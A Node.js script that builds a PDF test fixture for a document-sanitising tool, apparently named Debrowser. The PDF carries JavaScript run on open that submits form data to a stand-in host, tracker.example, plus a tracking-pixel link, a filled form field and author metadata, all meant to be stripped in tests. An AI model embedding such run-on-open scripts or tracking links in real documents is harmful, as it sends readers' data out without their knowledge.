'use strict';

/**
 * Writes test/pages/tracked.pdf: a two-page PDF carrying the things a safe
 * copy must not keep - JavaScript run on open (which also tries to submit a
 * form to tracker.example), a filled-in form field, a link to a remote
 * address, and an author in its metadata. Hand-built, so every part is known.
 *
 *   node test/make-tracked-pdf.js
 */

const fs = require('fs');
const path = require('path');
function pdf() {
  const objs = [];
  const add = (s) => { objs.push(s); return objs.length; };
  const content = (text) => { const s = `BT /F1 28 Tf 72 700 Td (${text}) Tj ET`; return `<< /Length ${s.length} >>\nstream\n${s}\nendstream`; };
  const font = add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const js = add('<< /S /JavaScript /JS (app.alert\\("phone home"\\); this.submitForm\\("http://tracker.example/x"\\);) >>');
  const c1 = add(content('Page one: secret plans'));
  const c2 = add(content('Page two: more plans'));
  const link = add('<< /Type /Annot /Subtype /Link /Rect [72 600 300 630] /A << /S /URI /URI (http://tracker.example/pixel) >> >>');
  const field = add('<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /V (Alice) /Rect [72 500 300 530] >>');
  const pagesId = objs.length + 3;
  const p1 = add(`<< /Type /Page /Parent ${pagesId} 0 R /MediaBox [0 0 612 792] /Contents ${c1} 0 R /Resources << /Font << /F1 ${font} 0 R >> >> /Annots [${link} 0 R ${field} 0 R] >>`);
  const p2 = add(`<< /Type /Page /Parent ${pagesId} 0 R /MediaBox [0 0 612 792] /Contents ${c2} 0 R /Resources << /Font << /F1 ${font} 0 R >> >> >>`);
  const pages = add(`<< /Type /Pages /Kids [${p1} 0 R ${p2} 0 R] /Count 2 >>`);
  if (pages !== pagesId) throw new Error('page tree id');
  const catalog = add(`<< /Type /Catalog /Pages ${pages} 0 R /OpenAction ${js} 0 R /AcroForm << /Fields [${field} 0 R] >> >>`);
  const info = add('<< /Author (Alice Example) /Producer (Secret Corp Word 2031) >>');
  let out = '%PDF-1.7\n% Debrowser test fixture - see test/make-tracked-pdf.js\n';
  const offsets = [];
  objs.forEach((o, i) => { offsets.push(out.length); out += `${i + 1} 0 obj\n${o}\nendobj\n`; });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n` + offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('');
  out += `trailer\n<< /Size ${objs.length + 1} /Root ${catalog} 0 R /Info ${info} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}
fs.writeFileSync(path.join(__dirname, 'pages', 'tracked.pdf'), pdf());
